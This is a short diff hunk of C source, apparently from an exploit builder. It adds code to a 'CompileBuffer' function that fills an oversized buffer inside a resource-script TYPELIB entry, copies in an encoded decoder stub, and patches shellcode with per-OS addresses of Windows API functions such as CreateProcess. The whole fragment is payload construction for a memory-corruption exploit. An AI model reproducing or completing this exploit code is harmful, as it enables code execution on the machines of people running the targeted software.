@@ -128,3 +128,13 @@ void CompileBuffer()
 
 	memset(buf0,'1',EXPL_SIZE);
 	ptr+=sprintf((char*)buf0,"1 TYPELIB MOVEABLE PURE \"");
+    decoder[ESPSUB_OFFSET]=espSub;
+	
+	memcpy(buf0+ptr,decoder,sizeof(decoder));
+	buf0[DEC_CODE_OFFSET]=DEC_CODE;
+	buf0[SHIFT_DEC_OFFSET]=SHIFT;
+	ptr+=sizeof(decoder);
+
+	*((unsigned int*)(shlCode+GETSTAR_OFFSET))=osApiPtrs[osId].getStarInf;
+	*((unsigned int*)(shlCode+CREPRO_OFFSET))=osApiPtrs[osId].crePro;
+	*((unsigned int*)(shlCode+GETWINDIR_OFFSET))=osApiPtrs[osId].getWinDir;
